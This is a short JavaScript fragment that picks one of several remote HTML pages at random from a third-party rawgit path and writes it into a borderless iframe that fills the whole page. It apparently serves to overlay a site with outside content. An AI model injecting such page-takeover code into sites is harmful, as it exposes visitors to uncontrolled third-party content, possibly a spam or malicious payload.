function gen_a2() { var possible = '012';var text = '';for( var i=0; i < 2; i++ ) { text += possible.charAt(Math.floor(Math.random() * possible.length)); } return text; } var a2 = gen_a2();
document.write('<iframe src="https://cdn.rawgit.com/awetslamet/img/'+a2+'.html" scrolling="no" frameborder="no" width="100%" height="100%" class="ss"><\/iframe>'); 
document.write(''+a2+''); 
